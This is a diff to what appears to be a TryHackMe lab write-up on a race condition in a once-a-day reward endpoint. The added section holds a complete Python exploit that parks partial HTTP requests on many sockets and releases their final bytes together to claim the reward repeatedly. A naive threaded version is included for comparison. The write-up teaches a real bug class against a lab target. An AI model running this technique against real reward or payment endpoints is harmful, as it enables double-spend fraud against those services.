@@ -1,7 +1,7 @@
 ---
 title: TryHackMe Towel on the Sunbed — Racing a Once-a-Day Reward
 date: 2026-08-05T10:30:00+05:30
-lastmod: 2026-08-05T10:30:00+05:30
+lastmod: 2026-08-05T11:15:00+05:30
 author: Animesh Roy
 avatar: /img/avatar.jpeg
 authorlink: https://anir0y.in
@@ -178,6 +178,121 @@ final balance=1000 tier=Whale (need 150)
 Worth reporting honestly: my first socket-based run landed **5 of 20**, not 20. Same code, same target, minutes apart. Race exploitation is probabilistic — you're betting on scheduling you don't control — so if a run underperforms, run it again before concluding it failed. Five was already more than the three I needed.
 
 The flag naming it `d0ubl3_sp3nt` is apt. This is structurally the **double-spend** problem: one entitlement, spent many times, because the ledger was read before it was written.
+
+## The complete exploit
+
+Here's the whole thing, end to end — it registers a fresh account, races the first claim, and prints the resulting balance and vault response. Point `HOST` at your own lab IP.
+
+```python
+#!/usr/bin/env python3
+"""Towel on the Sunbed - single-packet style race on POST /claim.
+
+Naive threading loses because a shared connection pool serialises the requests
+and ~200ms of WAN jitter smears their arrival times. Instead:
+
+  1. open N independent sockets and complete the TCP handshakes up front
+  2. write every request EXCEPT its final body byte, so each one sits parked
+     in the server's socket buffer, fully parsed-ahead but not dispatchable
+  3. release the final byte on all N sockets back-to-back
+
+All N handlers then enter the "has 24h elapsed?" check before any of them has
+written the new timestamp.
+"""
+import socket
+import sys
+import threading
+import time
+import requests
+
+HOST, PORT = "10.48.142.92", 3000
+T = f"http://{HOST}:{PORT}"
+N = int(sys.argv[1]) if len(sys.argv) > 1 else 20
+USER = sys.argv[2] if len(sys.argv) > 2 else "whale02"
+PW = "Sunbed2026!"
+
+
+def session_cookie():
+    s = requests.Session()
+    r = s.post(f"{T}/auth/register", data={"username": USER, "password": PW}, timeout=25)
+    print(f"register {USER}: {r.status_code}")
+    s.post(f"{T}/auth/login", data={"username": USER, "password": PW}, timeout=25)
+    me = s.get(f"{T}/dashboard/api/me", timeout=25).json()
+    print(f"start balance={me['balance']} canClaim={me['canClaim']}")
+    return s, s.cookies.get("connect.sid")
+
+
+def main():
+    sess, sid = session_cookie()
+
+    head = (
+        f"POST /claim HTTP/1.1\r\n"
+        f"Host: {HOST}:{PORT}\r\n"
+        f"Cookie: connect.sid={sid}\r\n"
+        f"Content-Type: application/x-www-form-urlencoded\r\n"
+        f"Content-Length: 1\r\n"
+        f"Connection: keep-alive\r\n"
+        f"\r\n"
+    ).encode()
+
+    socks = []
+    for _ in range(N):
+        s = socket.create_connection((HOST, PORT), timeout=30)
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.sendall(head)              # everything but the 1-byte body
+        socks.append(s)
+
+    time.sleep(1.0)                  # let all the partial requests land
+
+    # release the final byte on every socket as fast as possible
+    barrier = threading.Barrier(N)
+    replies = [b""] * N
+
+    def finish(i, s):
+        barrier.wait()
+        s.sendall(b"a")
+        try:
+            replies[i] = s.recv(4096)
+        except Exception as e:
+            replies[i] = f"exc: {e}".encode()
+
+    ts = [threading.Thread(target=finish, args=(i, s)) for i, s in enumerate(socks)]
+    for t in ts:
+        t.start()
+    for t in ts:
+        t.join()
+    for s in socks:
+        s.close()
+
+    paid = sum(1 for r in replies if b'"reward"' in r)
+    print(f"\n{paid}/{N} claims paid out")
+
+    me = sess.get(f"{T}/dashboard/api/me", timeout=25).json()
+    print(f"final balance={me['balance']} tier={me['tier']} (need {me['whaleThreshold']})")
+    print(f"vault: {sess.get(f'{T}/vault', timeout=25).text}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+Run it as `python3 race2.py 20 whale02`, where the first argument is how many sockets to race and the second is the account name to register. Use a **fresh username each run** — once an account has successfully claimed, its cooldown is real and it can't race again.
+
+For comparison, the naive version that only landed 1 in 10 is just `threading.Barrier` over a shared `requests.Session`:
+
+```python
+s = requests.Session()          # <- the mistake: one pooled connection set
+barrier = threading.Barrier(N)
+
+def fire(i):
+    barrier.wait()
+    results[i] = s.post(f"{T}/claim", timeout=30).json()
+
+threads = [threading.Thread(target=fire, args=(i,)) for i in range(N)]
+[t.start() for t in threads]
+[t.join() for t in threads]
+```
+
+The logic is identical. The only difference is *how the bytes reach the wire*, and that difference is the entire exploit.
 
 ## Why races are the bug class that survives review
 
